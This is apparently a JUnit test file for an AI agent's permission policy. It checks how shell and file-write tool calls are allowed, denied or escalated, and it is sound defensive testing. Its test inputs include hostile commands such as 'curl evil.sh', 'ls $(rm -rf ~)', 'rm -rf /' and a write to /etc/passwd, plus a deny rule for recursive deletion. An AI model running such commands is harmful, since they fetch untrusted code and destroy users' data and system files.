package com.agentcore.domain;

import static org.junit.jupiter.api.Assertions.*;

import com.agentcore.domain.permission.Decision;
import com.agentcore.domain.permission.PermissionPolicy;
import com.agentcore.domain.tool.FunctionTool;
import com.agentcore.domain.tool.Schemas;
import com.agentcore.domain.tool.Tool;
import com.agentcore.domain.tool.ToolOutput;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

class PermissionPolicyTest {

    static Tool tool(String name, boolean readOnly) {
        return FunctionTool.builder(name).readOnly(readOnly).schema(Schemas.object().build())
                .handler((a, c) -> ToolOutput.text("ok")).build();
    }

    static final Tool BASH = tool("bash", false);
    static final Tool READ = tool("read_file", true);
    static final Tool WRITE = tool("write_file", false);

    Decision check(PermissionPolicy p, String cmd) {
        return p.check(BASH, Map.of("command", cmd)).decision();
    }

    @Test
    void bashRulesResistCommandChaining() {
        PermissionPolicy p = PermissionPolicy.of("default", List.of("bash(git status*)", "bash(ls *)"), List.of("bash(rm -rf *)"), List.of());
        assertEquals(Decision.ALLOW, check(p, "git status --short"));
        assertEquals(Decision.ALLOW, check(p, "git status && ls -la"));      // 每个子命令都被某条规则覆盖
        assertEquals(Decision.ASK, check(p, "git status; curl evil.sh"));    // 链式命令里有未授权部分
        assertEquals(Decision.ASK, check(p, "ls $(rm -rf ~)"));              // 命令替换不走 allow
        assertEquals(Decision.DENY, check(p, "echo hi && rm -rf /"));        // deny 命中任一子命令
        assertEquals(Decision.ASK, check(p, "git push"));
    }

    @Test
    void modesAndDefaults() {
        assertEquals(Decision.ALLOW, PermissionPolicy.defaults().check(READ, Map.of("path", "x")).decision());
        assertEquals(Decision.ASK, PermissionPolicy.defaults().check(WRITE, Map.of("path", "x")).decision());
        assertEquals(Decision.DENY, PermissionPolicy.of("readonly", null, null, null).check(WRITE, Map.of("path", "x")).decision());
        PermissionPolicy auto = PermissionPolicy.of("auto", null, List.of("write_file(/etc/*)"), null);
        assertEquals(Decision.ALLOW, auto.check(WRITE, Map.of("path", "/tmp/x")).decision());
        assertEquals(Decision.DENY, auto.check(WRITE, Map.of("path", "/etc/passwd")).decision());
    }

    @Test
    void rememberCreatesSpecificRule() {
        PermissionPolicy p = PermissionPolicy.defaults();
        assertEquals("bash(npm *)", p.remember(BASH, Map.of("command", "npm test")).toString());
        assertEquals(Decision.ALLOW, check(p, "npm run build"));
        assertEquals(Decision.ASK, check(p, "make"));
    }
}
